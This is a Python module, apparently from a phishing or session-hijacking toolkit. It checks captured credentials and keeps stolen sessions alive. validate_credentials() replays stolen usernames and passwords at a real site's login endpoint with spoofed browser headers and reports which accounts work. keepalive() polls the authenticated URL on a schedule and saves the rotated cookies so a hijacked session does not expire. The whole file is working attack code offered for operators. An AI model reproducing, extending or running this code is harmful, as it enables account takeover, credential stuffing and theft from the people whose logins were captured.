"""Live-session operations: credential validation and keep-alive.

A captured session is a claim until it is proven. These two operations are what
an operator actually runs against the real site after a capture:

  validate_credentials()  - replay the stolen credentials at the real login
                            endpoint and report whether they still work, with
                            the evidence (redirect, cookie, marker). Labels are
                            CONFIRMED / REJECTED / UNKNOWN - never a guess.
  keepalive()             - hit the authenticated URL on a schedule so an idle
                            session does not expire, re-exporting the cookies
                            the site rotates each time.

Results are always one of three explicit outcomes, so a failed or
inconclusive check can never be read as a success.
"""
import contextlib
import time
import urllib.parse

RESULT_CONFIRMED = "CONFIRMED"
RESULT_REJECTED = "REJECTED"
RESULT_UNKNOWN = "UNKNOWN"

LOGIN_FAIL_MARKERS = ("invalid", "incorrect", "try again", "wrong password",
                      "authentication failed", "sign in failed", "not recognised",
                      "not recognized", "does not match", "too many attempts",
                      "account locked", "captcha", "verify you are human")
# Markers must be evidence of an AUTHENTICATED view. Generic greetings
# ("welcome", "profile", "inbox") appear on login pages too, so they are gone.
LOGIN_OK_MARKERS = ("sign out", "log out", "logout", "my account",
                    "account overview", "dashboard", "settings",
                    "signed in as", "your orders", "sign-out")


def _form_body(fields, extra=None):
    data = {k: v for k, v in (fields or {}).items() if v not in (None, "")}
    data.update(extra or {})
    return urllib.parse.urlencode(data)


def validate_credentials(rec, url, user_field="username", pass_field="password",
                         extra=None, success_markers=None, failure_markers=None,
                         user_value=None, pass_value=None, timeout=25, session=None):
    """Replay captured credentials against the real endpoint.

    Returns a dict with `result` (CONFIRMED/REJECTED/UNKNOWN), the HTTP evidence
    and the cookies the site issued, so the operator can promote a confirmed
    login into a session record.
    """
    import requests

    creds = dict(rec.get("credentials") or {})
    user = user_value or creds.get(user_field) or creds.get("username") or creds.get("email")
    pwd = pass_value or creds.get(pass_field) or creds.get("password")
    if not user or not pwd:
        return {"ok": False, "result": RESULT_UNKNOWN,
                "error": f"no {user_field}/{pass_field} in the session's credentials",
                "credentials_present": sorted(creds.keys())}

    body = _form_body({user_field: user, pass_field: pwd}, extra)
    ua = rec.get("ua") or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"
    hdrs = {"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Origin": _origin(url),
            "Referer": url}
    # start from the session's own jar: some sites need the pre-login cookie
    jar = {}
    for c in (rec.get("cookies") or []):
        if c.get("name") and c.get("value"):
            jar[c["name"]] = c["value"]
    try:
        s = session or requests.Session()
        r = s.post(url, data=body, headers=hdrs, cookies=jar, timeout=timeout,
                   allow_redirects=True)
    except Exception as e:
        return {"ok": False, "result": RESULT_UNKNOWN,
                "error": f"{type(e).__name__}: {e}", "url": url}

    text = (r.text or "")[:200000]
    low = text.lower()
    success = [m for m in (success_markers or LOGIN_OK_MARKERS) if m.lower() in low]
    failure = [m for m in (failure_markers or LOGIN_FAIL_MARKERS) if m.lower() in low]
    new_cookies = []
    try:
        for c in r.cookies:
            new_cookies.append({"name": c.name, "value": c.value,
                                "domain": c.domain or "", "path": c.path or "/",
                                "secure": bool(c.secure), "httpOnly": False,
                                "sameSite": "unspecified", "session": True})
    except Exception:
        pass
    landed = str(r.url)
    left_login = "login" not in landed.lower() and "signin" not in landed.lower()

    # A failure marker wins over a success marker: a page can say both
    # ("Welcome back! Invalid password" was reported CONFIRMED, which is a lie
    # to the operator).
    if failure:
        result, why = RESULT_REJECTED, f"failure marker on the page: {failure[0]!r}"
    elif success and left_login:
        result, why = RESULT_CONFIRMED, f"success marker: {success[0]!r}"
    elif success:
        result, why = RESULT_UNKNOWN, (
            f"success marker {success[0]!r} but the URL is still a login page - "
            f"inspect by hand")
    elif left_login and r.status_code in (200, 302) and not failure:
        result, why = RESULT_UNKNOWN, (
            f"left the login page ({landed}) with no marker; confirm by hand")
    else:
        result, why = RESULT_UNKNOWN, "no success or failure marker; inspect by hand"

    return {"ok": True, "result": result, "why": why, "status": r.status_code,
            "final_url": landed, "markers_hit": success, "markers_failed": failure,
            "cookies": new_cookies, "bytes": len(r.content or b""),
            "url": url, "user": user}


def _origin(url):
    p = urllib.parse.urlparse(url)
    return f"{p.scheme}://{p.netloc}" if p.netloc else ""


def keepalive(rec, url, interval=300, iterations=12, timeout=25, on_tick=None,
              session=None, stop_event=None):
    """Ping the authenticated URL so the session does not go idle.

    Each tick re-exports the cookies the site rotated (that is usually the real
    value: an idle session keeps its tokens fresh) and stops early if the site
    starts bouncing us to a login page, because that means the session is gone
    and continuing would only generate noise.
    """
    import requests

    if interval < 0:
        raise ValueError("interval must be >= 0")
    jar = {}
    for c in (rec.get("cookies") or []):
        if c.get("name"):
            jar[c["name"]] = c.get("value", "")
    ua = rec.get("ua") or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"
    ticks = []
    alive = True
    s = session or requests.Session()
    for i in range(max(1, int(iterations))):
        if stop_event is not None and stop_event.is_set():
            break
        entry = {"n": i + 1, "ts": time.time()}
        try:
            r = s.get(url, headers={"User-Agent": ua, "Accept": "text/html,*/*;q=0.8",
                                    "Referer": url}, cookies=jar, timeout=timeout,
                      allow_redirects=True)
            entry.update({"status": r.status_code, "final_url": str(r.url),
                          "bytes": len(r.content or b"")})
            low = (r.text or "")[:60000].lower()
            # An authenticated URL answering 401/403/440 is dead regardless of
            # what the body says (the loop kept polling a 401 five times).
            entry["logged_out"] = (r.status_code in (401, 403, 440)
                                   or "login" in str(r.url).lower()
                                   or "please log in" in low
                                   or "session expired" in low
                                   or "sign in to continue" in low)
            rotated = []
            for c in r.cookies:
                if jar.get(c.name) != c.value:
                    rotated.append(c.name)
                jar[c.name] = c.value
            entry["cookies_rotated"] = rotated
            if rotated:
                from . import session as session_mod
                session_mod.add_cookies(rec, [
                    {"name": c.name, "value": c.value, "domain": c.domain or "",
                     "path": c.path or "/", "secure": bool(c.secure),
                     "httpOnly": False, "sameSite": "unspecified",
                     "session": not bool(c.expires),
                     "expirationDate": c.expires if c.expires else None}
                    for c in r.cookies])
            if entry["logged_out"]:
                alive = False
                entry["stopped"] = "site bounced us to a login page"
        except Exception as e:
            entry["error"] = f"{type(e).__name__}: {e}"
        ticks.append(entry)
        if on_tick:
            with contextlib.suppress(Exception):
                on_tick(entry, rec)
        if not alive:
            break
        if i + 1 < int(iterations) and interval:
            if stop_event is not None:
                if stop_event.wait(interval):
                    break
            else:
                time.sleep(interval)
    return {"ok": True, "alive": alive, "ticks": ticks,
            "kept": sum(1 for t in ticks if t.get("status") == 200),
            "url": url}
